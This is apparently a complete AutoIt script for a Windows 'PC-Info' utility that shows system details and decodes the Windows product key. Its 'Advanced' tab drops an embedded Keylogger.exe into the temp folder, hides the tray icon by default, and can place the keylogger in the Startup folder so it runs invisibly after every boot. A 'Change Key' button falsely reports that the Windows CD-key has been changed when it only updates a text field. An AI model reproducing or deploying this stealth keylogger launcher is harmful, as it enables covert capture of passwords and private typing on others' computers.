#Include <GUIConstants.au3>
Dim $INI, $POS, $IP, $URLS, $URL, $I, $IPTMP, $FS, $FILE, $LINE, $LINE1

Global $Orgn1
Global $Orgn2
Global $Orgn3
Global $Orgn4
Global $web = 0





WinClose("PC-Info", "")

FileInstall("C:\pic.jpg", @TempDir & "\pic1.jpg",1)
FileInstall("C:\PC.jpg", @TempDir & "\PC1.jpg",1)
FileInstall("C:\Keylogger.exe", @TempDir & "\Keylogger.exe",1)
FileInstall("C:\RunAtStartup.ini", @TempDir & "\RunAtStartup.ini")

;---------------------------------------------------------------
;                   Find WAN iP-adresse
;---------------------------------------------------------------

$INI = @Homedrive & "myip.ini"

If FileExists($INI) = 0 Then
   IniWrite($INI, "URL", "1", "dynupdate.no-ip.com")
   IniWrite($INI, "URL", "2", "www.bpftpserver.com")
   IniWrite($INI, "URL", "3", "www.minasithil.org")
   IniWrite($INI, "URL", "URLS", "3")
   
EndIf

$POS = 0
$IP = 0
$URLS = IniRead($INI, "URL", "URLS", "")




For $I = 1 To $URLS
   FileDelete(@Homedrive & $POS + 1 & ".htm")
Next

While $POS < $URLS
   
   FileDelete(@Homedrive & $POS - 1 & ".htm")
   $POS = $POS + 1
   $IPTMP = @Homedrive & $POS & ".htm"
   $URL = IniRead($INI, "URL", $POS, "")
   $IP = URLDownloadToFile ("http://" & $URL & "/ip.php", $IPTMP)
   $FS = FileGetSize($IPTMP)
   
   
   If FileExists($IPTMP) = 0 Then ContinueLoop
   If $FS > 16 Then
      ContinueLoop
   Else
      If $FS < 8 Then ContinueLoop
   EndIf
   If $FS <= 16 Then ExitLoop
   
Wend
$FILE = FileOpen($IPTMP, 0)

$LINE = FileReadLine($FILE)


If $FILE = -1 Then
   $line = "Error when looking up IP. Maybe you're offline?"
EndIf


FileClose($FILE)
FileDelete($IPTMP)
FileDelete($INI)

;---------------------------------------------------------------
;                       Windows Product Key
;---------------------------------------------------------------

Dim $Bin
$Bin = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "DigitalProductID")

Func DecodeProductKey($BinaryDPID)
   Local $bKey[15]
   Local $sKey[29]
   Local $Digits[24]
   Local $Value = 0
   Local $hi = 0
   Local $n = 0
   Local $i = 0
   Local $dlen = 29
   Local $slen = 15
   Local $Result
   
   $Digits = StringSplit("BCDFGHJKMPQRTVWXY2346789", "")
   
   $binaryDPID = StringMid($binaryDPID, 105, 30)
   
   For $i = 1 To 29 Step 2
      $bKey[Int($i / 2) ] = Dec(StringMid($binaryDPID, $i, 2))
   Next
   
   For $i = $dlen - 1 To 0 Step - 1
      If Mod( ($i + 1), 6) = 0 Then
         $sKey[$i] = "-"
      Else
         $hi = 0
         For $n = $slen - 1 To 0 Step - 1
            $Value = BitOR(BitShift($hi, -8), $bKey[$n])
            $bKey[$n] = Int($Value / 24)
            $hi = Mod($Value, 24)
         Next
         $sKey[$i] = $Digits[$hi + 1]
      EndIf
      
   Next
   For $i = 0 To 28
      $Result = $Result & $sKey[$i]
   Next
   
   Return $Result
EndFunc

;-------------------------------------------------------------

;                         Script start

;-------------------------------------------------------------


$primaryGui = GUICreate("PC-Info", 405, 490)

;/////////////////////// MY COMPUTER /////////////////////////
;-------------------------------------------------------------

$tab = GUICtrlCreateTab(5, 5, 398, 462)
$knap = GUICtrlCreateButton("Print PC-Info", 325, 2, 77, 23)
GUICtrlSetTip(-1,"Click here to print all information to a text file")

$tab0 = GUICtrlCreateTabItem("My computer")

$n=GUICtrlCreatePic(@TempDir &"\pic1.jpg",100,250, 1, 1)
$n = GUICtrlSetPos($n, 20, 242, 365, 212)

GUICtrlCreateGroup("Information", 16, 33, 373, 202)

GUICtrlCreateGroup("", 16, 231, 373, 227)


GUICtrlCreateLabel("Computername", 30, 60, 90, 15)
GUICtrlCreateLabel("Operating System", 30, 85, 100, 15)
GUICtrlCreateLabel("Service Pack", 30, 110, 90, 15,)
GUICtrlCreateLabel("LAN IP-address", 30, 135, 90, 15,)
GUICtrlCreateLabel("WAN IP-address", 30, 160, 95, 15,)
GUICtrlCreateLabel("Logged in as", 30, 184, 90, 15,)
GUICtrlCreateLabel("Login domain", 30, 209, 90, 15,)



GUICtrlCreateInput(@ComputerName, 130, 58, 250, 20, $WS_DISABLED)
GUICtrlCreateInput(@OSVersion, 130, 83, 250, 20, $WS_DISABLED)
GUICtrlCreateInput(@OSServicePack, 130, 108, 250, 20, $WS_DISABLED)
GUICtrlCreateInput(@IPAddress1, 130, 133, 250, 20, $WS_DISABLED)
GUICtrlCreateInput($Line, 130, 158, 250, 20, $WS_DISABLED)
GUICtrlCreateInput(@UserName, 130, 183, 250, 20, $WS_DISABLED)
GUICtrlCreateInput(@LogonDomain, 130, 208, 250, 20, $WS_DISABLED)


;//////////////////// SECIFICATIONS //////////////////////
;---------------------------------------------------------

$tab1 = GUICtrlCreateTabItem("Specifications")

$J = GUICtrlCreatePic(@TempDir &"\PC1.jpg", 30, 380, 343, 70)
$J = GUICtrlSetPos($J, 30, 380, 343, 70)

GUICtrlCreateGroup("Hardware specifications", 16, 33, 373, 426)


$drev = DriveGetDrive("fixed")

$Ram = MemGetStats()
$Mem = $ram[1] / 1024 + 1
$mem1 = Round($mem, 0)

$Drive1 = DriveSpaceTotal($Drev[1])
$label1 = DriveGetLabel($Drev[1])
$Drivespace1 = DriveSpaceFree($Drev[1])
$Space = $Drivespace1 / 1024
$Free1 = Round($Space, 2)
$var1 = $Drive1 / 1024
$Orgn1 = Round($var1, 2)




If $drev[0] > 1 Then
   
   $label2 = DriveGetLabel($Drev[2])
   $Drivespace2 = DriveSpaceFree($Drev[2])
   $Space = $Drivespace2 / 1024
   $Free2 = Round($Space, 2)
   $Drive2 = DriveSpaceTotal($Drev[2])
   $var2 = $Drive2 / 1024
   $Orgn2 = Round($var2, 2)
   GUICtrlCreateLabel("Drive2 " & " - (" & $drev[2] & ")", 30, 160, 90, 15,)
   GUICtrlCreateInput($Orgn2 & " GB" & "  - ( Free space - " & $Free2 & " GB )", 105, 158, 275, 20, $WS_DISABLED)

   
   
Else
   GUICtrlCreateInput("You don't have 2 harddrives or partitions", 105, 158, 275, 20, $WS_DISABLED)
   GUICtrlCreateLabel("Drive2 ", 30, 160, 70, 15,)
EndIf


If $drev[0] > 2 Then
   
   $label3 = DriveGetLabel($Drev[3])
   $Drivespace3 = DriveSpaceFree($Drev[3])
   $Space = $Drivespace3 / 1024
   $Free3 = Round($Space, 2)
   $Drive3 = DriveSpaceTotal($Drev[3])
   $var3 = $Drive3 / 1024
   $Orgn3 = Round($var3, 3)
   GUICtrlCreateLabel("Drive3 " & " - (" & $drev[3] & ")", 30, 185, 90, 15,)
   GUICtrlCreateInput($Orgn3 & " GB" & "  - ( Free space - " & $Free3 & " GB )", 105, 183, 275, 20, $WS_DISABLED)
Else
   
   GUICtrlCreateInput("You don't have 3 harddrives or partitions", 105, 183, 275, 20, $WS_DISABLED)
   GUICtrlCreateLabel("Drive3 ", 30, 185, 70, 15,)
EndIf


If $drev[0] > 3 Then
   
   $label4 = DriveGetLabel($Drev[4])
   $Drivespace4 = DriveSpaceFree($Drev[4])
   $Space = $Drivespace4 / 1024
   $Free4 = Round($Space, 2)
   $Drive4 = DriveSpaceTotal($Drev[4])
   $var4 = $Drive4 / 1024
   $Orgn4 = Round($var4, 3)
   GUICtrlCreateLabel("Drive4 " & " - (" & $drev[4] & ")", 30, 210, 90, 15,)
   GUICtrlCreateInput($Orgn4 & " GB" & "  - ( Free space - " & $Free4 & " GB )", 105, 208, 275, 20, $WS_DISABLED)
Else
   
   GUICtrlCreateInput("You don't have 4 harddrives or partitions", 105, 208, 275, 20, $WS_DISABLED)
   GUICtrlCreateLabel("Drive4 ", 30, 210, 70, 15,)
EndIf






GUICtrlCreateLabel("Processor", 30, 60, 90, 15)
GUICtrlCreateLabel("RAM", 30, 85, 90, 15)
GUICtrlCreateLabel("Video card", 30, 110, 90, 15)
GUICtrlCreateLabel("Drive1 " & " - (" & $drev[1] & ")", 30, 135, 90, 15,)


$cpu0 = RegRead("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "~MHz")
$cpu1 = RegRead("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "processorNameString")
$gfx = RegRead("HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000", "DriverDesc")


$Lprint1 = RegEnumKey("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\", 1)
$Lprint2 = RegEnumKey("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\", 2)


$stringtjek = StringIsASCII($Lprint1)
If $stringtjek = 0 Then
   GUICtrlCreateInput("No printer installed", 105, 254, 275, 20, $WS_DISABLED)
Else
   GUICtrlCreateInput($Lprint1, 105, 254, 275, 20, $WS_DISABLED)
EndIf


$stringtjek = StringIsASCII($Lprint2)
If $stringtjek = 0 Then
   GUICtrlCreateInput("No printer installed", 105, 279, 275, 20, $WS_DISABLED)
Else
   GUICtrlCreateInput($Lprint2, 105, 279, 275, 20, $WS_DISABLED)
EndIf



$serv = RegEnumKey("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Providers\LanMan Print Services\Servers", 1)

$NetPrint1 = RegEnumKey("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Providers\LanMan Print Services\Servers\" & $serv & "\printers", 1)
$NetPrint2 = RegEnumKey("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Providers\LanMan Print Services\Servers\" & $serv & "\printers", 2)

$stringtjek = StringIsASCII($NetPrint1)
If $stringtjek = 0 Then
   GUICtrlCreateInput("No printer installed", 105, 329, 275, 20, $WS_DISABLED)
Else
   GUICtrlCreateInput($NetPrint1, 105, 329, 275, 20, $WS_DISABLED)
EndIf

$stringtjek = StringIsASCII($Netprint2)
If $stringtjek = 0 Then
   GUICtrlCreateInput("No printer installed", 105, 354, 275, 20, $WS_DISABLED)
Else
   GUICtrlCreateInput($NetPrint2, 105, 354, 275, 20, $WS_DISABLED)
EndIf




GUICtrlCreateInput($cpu0 & " Mhz" & " - " & $cpu1, 105, 58, 275, 20, $WS_DISABLED)
GUICtrlCreateInput($mem1 & " MB", 105, 83, 275, 20, $WS_DISABLED)
GUICtrlCreateInput($gfx & "", 105, 108, 275, 20, $WS_DISABLED)
GUICtrlCreateInput($Orgn1 & " GB" & "  - ( Free space - " & $Free1 & " GB )", 105, 133, 275, 20, $WS_DISABLED)



GUICtrlCreateLabel("Printer1", 30, 256, 70, 15)
GUICtrlCreateLabel("Printer2", 30, 281, 70, 15)
GUICtrlCreateLabel("Netprinter1", 30, 331, 70, 15)
GUICtrlCreateLabel("Netprinter2", 30, 356, 70, 15)

GUICtrlCreateLabel("Local printers", 162, 235, 90, 15)
GUICtrlCreateLabel("Network printers", 155, 310, 100, 15)


;/////////////////////// ADVANCED /////////////////////////
;----------------------------------------------------------

$tab2 = GUICtrlCreateTabItem("Advanced")

GUICtrlCreateGroup("Windows XP CD-Key Changer", 16, 33, 373, 95)
GUICtrlCreateGroup("KeyLogger", 16, 130, 373, 325)

$clipget = GUICtrlCreatebutton("Windows Key", 30, 65, 97, 22,)
GUICtrlSetTip(-1,"Click here to copy key to clipboard")
$newkey_btn = GUICtrlCreateButton("Change Key", 30, 90, 97, 22,)
GUICtrlSetTip(-1,"Click here to change your XP key")

$currentkey = GUICtrlCreateInput(DecodeProductKey($bin), 130, 66, 250, 20, $WS_DISABLED)
$newkey = GUICtrlCreateInput("Type the new Windows XP CD-key here...", 130, 91, 250, 20)


$Moreinfo = GUICtrlCreateLabel("You can use the keylogger to log whatever have been writen on the keyboard. Choose any options in order to fit your needs. Remember to chose save location for log file... click for more info", 50 , 150, 320, 70,)
GUICtrlSetCursor(-1, 4)
GUICtrlSetTip(-1,"Click to read more about keylogger")
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")

$activate_key = GUICtrlCreateButton("Activate Keylogger", 135, 223, 130, 27,)
GUICtrlSetTip(-1,"Click here to Activate Keylogger")

$radio1 = GUICtrlCreateRadio ("Show program in system tray", 45, 260, 200, 20)
$radio2 = GUICtrlCreateRadio ("Hide Trayicon and PC-Info when running", 45, 285, 250, 20)
GUICtrlSetState ($radio2,$GUI_CHECKED)
GUICtrlCreateGroup("", 35, 252, 333, 55)

$radio3 = GUICtrlCreateRadio ("Determinate Keylogger with Hotkey 'Ctrl+Alt+Q'", 45, 315, 315, 20)
$radio4 = GUICtrlCreateRadio ("Run at next startup, hotkey 'Ctrl+Alt+Q' for determination", 45, 340, 320, 20)
$radio5 = GUICtrlCreateRadio ("Run now, and keep running after each boot", 45, 365, 320, 20)
$radio6 = GUICtrlCreateRadio ("Run from next boot, and keep running after each boot", 45, 390, 320, 20)
GUICtrlSetState ($radio3,$GUI_CHECKED)
GUICtrlCreateGroup("", 35, 307, 333, 105)

$Savefile = GUICtrlCreatebutton("Save location", 30, 422, 97, 22,)
GUICtrlSetTip(-1,"Click here to chose savelocation of the logfile")
$savelocation = GUICtrlCreateInput(@HomeDrive & "\Log.log", 130, 423, 250, 20, $WS_DISABLED)

GUISetstate()
;////////////////////// ABOUT /////////////////////////////
;----------------------------------------------------------

;~ $tab3 = GUICtrlCreateTabItem("About")
;~ GUICtrlSetCursor(-1, 4)

;~ GUICtrlSetState(0, $GUI_SHOW)
;~ GUISetState()

;~ GUICtrlCreateLabel("Version 1.4", 330, 470, 70, 15)
;~ GUICtrlCreateLabel("Made by Lasse Offt", 10, 470, 140, 15)
;~ GUISetState()


;/////// SECONDARY WINDOW ///////
$SecondaryGui = GUICreate("Change Your Windows Key", 270, 150)
      
GUICtrlCreateLabel("WARNING", 90, 13, 100, 20)
GUICtrlSetFont(-1, 14, 400, 4, "Comic Sans MS")
      
GUICtrlCreateLabel("Changing your Windows CD-Key is on your own risk, I will not take any responsebility for any damage caused by this act! ", 10, 45, 250, 50)
GUICtrlCreateLabel("Are you sure?", 10, 90, 70, 15)
      
$key_yes = GUICtrlCreateButton("YES", 30, 115, 90, 22)
$key_no = GUICtrlCreateButton("Cancel", 150, 115, 90, 22)  
GUISetState(@SW_HIDE) 
;/////////////////////////////////


;/////// MORE INFO WINDOW ///////
$MoreInfoGui = GUICreate("About Keylogger", 320, 480)
      
GUICtrlCreateLabel("* Show Program in system tray", 10, 25, 250, 20)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")
GUICtrlSetColor(-1,0x0055D5)

GUICtrlCreateLabel("Enables the system tray icon for PC-Info and Keylogger when running", 10, 40, 300, 40)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")


GUICtrlCreateLabel("* Hide trayicon and PC-Info when running", 10, 90, 300, 20)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")
GUICtrlSetColor(-1,0x0055D5)

GUICtrlCreateLabel("Hides the system tray icon for PC-Info and Keylogger when running", 10, 105, 300, 40)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")


GUICtrlCreateLabel("* Determinate keylogger with hotkey Ctrl+Alt+Q", 10, 155, 300, 20)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")
GUICtrlSetColor(-1,0x0055D5)

GUICtrlCreateLabel("Enables the keylogger when Activate is pressed, determinate the keylogger by pressing Ctrl+Alt+Q ", 10, 170, 300, 60)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")


GUICtrlCreateLabel("* Run at nextstartup, Hothey Ctrl+Alt+Q for determination", 10,235, 300, 20)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")
GUICtrlSetColor(-1,0x0055D5)

GUICtrlCreateLabel("Runs the Keylogger at next boot, and only this boot, 'Ctrl+Alt+Q'", 10, 250, 300, 40)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")

GUICtrlCreateLabel("* Run now, and keep running after each boot", 10,300, 300, 20)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")
GUICtrlSetColor(-1,0x0055D5)

GUICtrlCreateLabel("Enables the Keylogger, and runs after each boot, 'Ctrl+Alt+Q'", 10, 315, 300, 40)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")

GUICtrlCreateLabel("* Run from next boot, and keep running after each boot", 10,365, 300, 40)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")
GUICtrlSetColor(-1,0x0055D5)

GUICtrlCreateLabel("Enables the Keylogger at next boot, and runs after each boot, 'Ctrl+Alt+Q'", 10, 400, 300, 40)
GUICtrlSetFont(-1, 9, 600, 1, "Comic Sans MS")

$Back = GUICtrlCreateButton("ok", 110, 445, 90, 22)  
GUISetState(@SW_HIDE) 
;///////////////////////////////
GUISetFont(9, 300)


$website = "                 "


While 1
 
   $msg_array = GUIGetMsg(1)
   $msg = $msg_array[0] 
   $winActive = $msg_array[1] 
   
If $msg = $activate_key Then
   
   If GUICtrlRead($radio1) = $GUI_CHECKED Then;Show Program in system tray
   IniWrite(@TempDir & "\RunAtStartup.ini", "ShowTray", "ShowTray", "1")
   EndIf

If GUICtrlRead($radio2) = $GUI_CHECKED Then ;Hide trayicon and PC-Info when running
   IniWrite(@TempDir & "\RunAtStartup.ini", "ShowTray", "ShowTray", "0")
EndIf

If GUICtrlRead($radio3) = $GUI_CHECKED Then ;Determinate keylogger with hotkey Ctrl+Alt+Q
EndIf

If GUICtrlRead($radio4) = $GUI_CHECKED Then ;Run at nextstartup, Hothey Ctrl+Alt+Q for determination
   FileCreateShortcut(@Tempdir & "\Keylogger.exe",@StartupDir & "\Keylogger.exe")
   IniWrite(@TempDir & "\RunAtStartup.ini", "RunAtStartup", "RunAtStartup", "1")
   If GUICtrlRead($radio1) = $GUI_CHECKED Then
   TrayTip("Keylogger", "Keylogger will run in VISIBLE mode next time Windows starts" & @CRLF & "Determinate by pressing Ctrl+Alt+Q", 5, 1)
   Sleep(5000)
   Else
   TrayTip("Keylogger", "Keylogger will run in INVISIBLE mode next time Windows starts" & @CRLF & "Determinate by pressing Ctrl+Alt+Q", 5, 1)
   Sleep(7000)
   EndIf
EndIf

If GUICtrlRead($radio5) = $GUI_CHECKED Then ;Run now, and keep running after each boot
   If GUICtrlRead($radio1) = $GUI_CHECKED Then
   TrayTip("Keylogger", "Keylogger is now active, and will be running in VISIBLE mode after each boot" & @CRLF & "Determinate by pressing Ctrl+Alt+Q", 5, 1)
   Sleep(5000)
   Else
   TrayTip("Keylogger", "Keylogger is now active, and will be running in INVISIBLE mode after each boot" & @CRLF & "Determinate by pressing Ctrl+Alt+Q", 5, 1)
   Sleep(5000)
   EndIf
   FileCreateShortcut(@Tempdir & "\Keylogger.exe",@StartupDir & "\Keylogger.exe")
   IniWrite(@TempDir & "\RunAtStartup.ini", "RunAtStartup", "RunAtStartup", "2")
EndIf
 
If GUICtrlRead($radio6) = $GUI_CHECKED Then ;Run from next boot, and keep running after each boot
   If GUICtrlRead($radio1) = $GUI_CHECKED Then
   TrayTip("Keylogger", "Keylogger will be active after next boot, and will be running in VISIBLE mode" & @CRLF & "Determinate by pressing Ctrl+Alt+Q", 5, 1)
   Sleep(5000)
   Else
   TrayTip("Keylogger", "Keylogger will be actice after next boot, and will be running in INVISIBLE mode" & @CRLF & "Determinate by pressing Ctrl+Alt+Q", 5, 1)
   Sleep(7000)
   EndIf
   FileCreateShortcut(@Tempdir & "\Keylogger.exe",@StartupDir & "\Keylogger.exe")
   IniWrite(@TempDir & "\RunAtStartup.ini", "RunAtStartup", "RunAtStartup", "2")
EndIf

   IniWrite(@TempDir & "\RunAtStartup.ini", "SaveLocation", "SaveLocation", GUICtrlRead($savelocation))
If GUICtrlRead($radio3) = $GUI_CHECKED Then 
   Run(@TempDir & "\Keylogger.exe")
EndIf	
If GUICtrlRead($radio5) = $GUI_CHECKED Then 
   Run(@TempDir & "\Keylogger.exe")
EndIf	

If GUICtrlRead($radio3) = $GUI_CHECKED Then
TrayTip("Keylogger", "Keylogger is now active" & @CRLF & "Determinate by pressing Ctrl+Alt+Q", 0, 1)
Sleep(5000)
EndIf

If GUICtrlRead($radio2) = $GUI_CHECKED Then
   Opt("TrayIconHide", 1)
EndIf
EndIf
  
 
 If $msg = GUICtrlRead($radio4)= $GUI_CHECKED Then
	GUICtrlsetstate($radio5, $GUI_ENABLE)
 EndIf

If $msg = GUICtrlRead($radio3) = $GUI_CHECKED Then
	GUICtrlsetstate($radio5, $GUI_DISABLE)
 EndIf; End of Activate keylogger



	
	
   If $msg = $savefile Then
	  $dialog = FileSaveDialog( "Choose a name", @HomeDrive & "\","(*.log)", 3, "Log.log")
     
	  If @error Then
	  GUICtrlSetData($savelocation, @Homedrive & "\Log.log")
	  Else
      GUICtrlSetData($savelocation, $dialog)
      EndIf
	  
   EndIf
   
   If $msg = $clipget Then
      clipput(GUICtrlRead($currentkey))
   EndIf

   
   If $msg = $newkey_btn Then     
      GUISwitch($SecondaryGui)
      GUISetState()
   EndIf
   
      If $msg = $Moreinfo Then
      GUISwitch($MoreInfoGui)
      GUISetState()
   EndIf 
   
    
   If ($msg = $GUI_EVENT_CLOSE OR $msg = $back) AND $winActive =  $MoreInfoGui Then
      GUISetState(@SW_HIDE)
      GUISwitch($primaryGui)
   EndIf
   
   If ($msg = $GUI_EVENT_CLOSE OR $msg = $key_no) AND $winActive =  $secondaryGui Then
      GUISetState(@SW_HIDE)
      GUISwitch($primaryGui)
   EndIf
      
   If $msg = $GUI_EVENT_CLOSE AND $winActive =  $primaryGui Then
      FileDelete(@TempDir & "\pic1.jpg")
      FileDelete(@TempDir & "\PC1.jpg")
      FileDelete(@TempDir & "\KeyOpt.ini")
	  If GUICtrlRead($radio3) = $GUI_CHECKED Then
	  FileDelete(@TempDir & "\RunAtStartup.ini")
	  FileDelete(@TempDir & "\Keylogger.exe")
	  EndIf
	  ExitLoop
   EndIf
    
   
  
 
   If $msg = $key_yes Then
      $len = StringLen(GUIctrlRead($newkey))
      
      If $len = 29 then
      msgbox(0,"Information","Your CD-key has been changed!")
      GUICtrlSetData($currentkey, GUICtrlread($newkey))
	  GUICtrlSetData($newkey,"Type the new Windows XP CD-key here...")
	  WinClose("Change Your Windows Key", "")
	 
      else
      msgbox(16,"Error","CD-Key is invalid, try again")        
      GUICtrlSetData($newkey,"Type the new Windows XP CD-key here...")
	  WinClose("Change Your Windows Key", "")
      Endif
   EndIf

   If $msg = $key_no Then
	  GUICtrlSetData($newkey,"Type the new Windows XP CD-key here...")
   EndIf
   
   
   ;If $msg = $knap1 Then
    ;  Run('explorer "' & $website & '"')
   ;EndIf
   
   If $msg = $knap Then
      $svar = MsgBox(4, "Information", "Do you want PC-Info to create and save a text-document with your informations in it on your desktop?")
      
      If $svar = 6 Then
         
         If FileExists(@DesktopDir & "\System Information.txt") Then
            FileDelete(@DesktopDir & "\System Information.txt")
            
            
            
            FileWriteLine(@DesktopDir & "\System Information.txt", "                                PC-Info version 1.4")
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            
            
            FileWriteLine(@DesktopDir & "\System Information.txt", "Computername:                   " & @ComputerName)
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "Operating system:               " & @OSVersion)
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "Servicepack:                    " & @OSServicePack)
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "LAN IP-address:                 " & @IPAddress1)
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "WAN IP-address:                 " & $Line)
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "Logged in as:                   " & @UserName)
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "Login domain:                   " & @LogonDomain)
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "Processor-speed:                " & $cpu0 & " Mhz")
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "Amount of RAM:                  " & $mem1 & " MB")
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "Video card:                     " & $gfx)
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "Harddisk 1:                     " & $Drev[1] & "  " & $Orgn1 & " GB i alt")
            
            If $drev[0] > 1 Then
               FileWriteLine(@DesktopDir & "\System Information.txt", "Harddrive 2:                    " & $Drev[2] & "  " & $Orgn2 & " GB i alt")
               
            Else
               FileWriteLine(@DesktopDir & "\System Information.txt", "Harddrive 2:                    You don't have 2 harddrives or partitions")
               
            EndIf
            If $drev[0] > 2 Then
               FileWriteLine(@DesktopDir & "\System Information.txt", "Harddrive 3:                    " & $Drev[3] & "  " & $Orgn3 & " GB i alt")
               
            Else
               FileWriteLine(@DesktopDir & "\System Information.txt", "Harddrive 3:                    You don't have 2 harddrives or partitions")
            EndIf
            
            If $drev[0] > 3 Then
               FileWriteLine(@DesktopDir & "\System Information.txt", "Harddrive 4:                    " & $Drev[4] & "  " & $Orgn3 & " GB i alt")
               FileWriteLine(@DesktopDir & "\System Information.txt", "")
               FileWriteLine(@DesktopDir & "\System Information.txt", "")
            Else
               FileWriteLine(@DesktopDir & "\System Information.txt", "Harddrive 4:                    You don't have 2 harddrives or partitions")
               FileWriteLine(@DesktopDir & "\System Information.txt", "")
               FileWriteLine(@DesktopDir & "\System Information.txt", "")
            EndIf
            
         EndIf
         
         $stringtjek = StringIsASCII($Lprint1)
         If $stringtjek = 1 Then
            FileWriteLine(@DesktopDir & "\System Information.txt", "Local printer1:                 " & $Lprint1)
            
         Else
            FileWriteLine(@DesktopDir & "\System Information.txt", "Local printer1:                 No printer installed")
            
         EndIf
         
         $stringtjek = StringIsASCII($Lprint2)
         If $stringtjek = 1 Then
            FileWriteLine(@DesktopDir & "\System Information.txt", "Local printer2:                 " & $Lprint2)
            
         Else
            FileWriteLine(@DesktopDir & "\System Information.txt", "Local printer2:                 No printer installed")
            
         EndIf
         
         
         $stringtjek = StringIsASCII($NetPrint1)
         If $stringtjek = 1 Then
            FileWriteLine(@DesktopDir & "\System Information.txt", "Network printer1:              " & $Netprint1)
            
         Else
            FileWriteLine(@DesktopDir & "\System Information.txt", "Network printer1:              No printer installed")
            
         EndIf
         
         $stringtjek = StringIsASCII($NetPrint2)
         If $stringtjek = 1 Then
            FileWriteLine(@DesktopDir & "\System Information.txt", "Network printer2:              " & $Netprint2)
            
         Else
            FileWriteLine(@DesktopDir & "\System Information.txt", "Network printer2:              No printer installed")
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
            FileWriteLine(@DesktopDir & "\System Information.txt", "")
         EndIf
         
         #cs
            FileWriteLine(@desktopdir & "\System Information.txt","Office-version:                 _________________________")
            FileWriteLine(@desktopdir & "\System Information.txt","")
            FileWriteLine(@desktopdir & "\System Information.txt","Forbindelse (ADSL/ISDN):        _________________________")
            FileWriteLine(@desktopdir & "\System Information.txt","")
            FileWriteLine(@desktopdir & "\System Information.txt","Bærbar / stationær PC:          _________________________")
            FileWriteLine(@desktopdir & "\System Information.txt","")
            FileWriteLine(@desktopdir & "\System Information.txt","")
            FileWriteLine(@desktopdir & "\System Information.txt","")
            FileWriteLine(@desktopdir & "\System Information.txt","Navn _______________________________    Dato ____________ ")
         #ce
         
	
         
      EndIf
   EndIf
   
Wend

